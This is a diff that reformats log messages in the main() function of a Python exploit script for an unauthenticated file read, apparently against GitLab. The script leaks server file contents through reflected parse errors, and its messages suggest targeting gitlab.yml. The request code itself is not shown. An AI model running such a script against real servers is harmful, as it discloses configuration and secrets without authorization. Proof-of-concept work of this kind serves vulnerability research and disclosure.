@@ -128,7 +128,9 @@ def main():
     status, message, leaked = read_file(base_url, project_id, args.file)
 
     if leaked is not None:
-        log(f"[+] File disclosed via reflected parse error (HTTP {status}). Content on stdout:")
+        log(
+            f"[+] File disclosed via reflected parse error (HTTP {status}). Content on stdout:"
+        )
         # Only the recovered file bytes go to stdout so output can be piped/saved.
         sys.stdout.write(leaked)
         if not leaked.endswith("\n"):
@@ -136,8 +138,12 @@ def main():
         return 0
 
     if status == 401 or "branch is required" in message:
-        log("[-] The file was read before authorization but parsed cleanly, so no bytes were reflected.")
-        log("    Try a file containing malformed %-escapes (e.g. the default gitlab.yml).")
+        log(
+            "[-] The file was read before authorization but parsed cleanly, so no bytes were reflected."
+        )
+        log(
+            "    Try a file containing malformed %-escapes (e.g. the default gitlab.yml)."
+        )
         return 3
 
     if "local file not present" in message:
@@ -145,7 +151,9 @@ def main():
         return 2
 
     if status == 500:
-        log(f"[-] HTTP 500: the path is likely unreadable (permission denied) or is a directory: {args.file}")
+        log(
+            f"[-] HTTP 500: the path is likely unreadable (permission denied) or is a directory: {args.file}"
+        )
         return 4
 
     log(f"[-] Unexpected response (HTTP {status}): {message}")
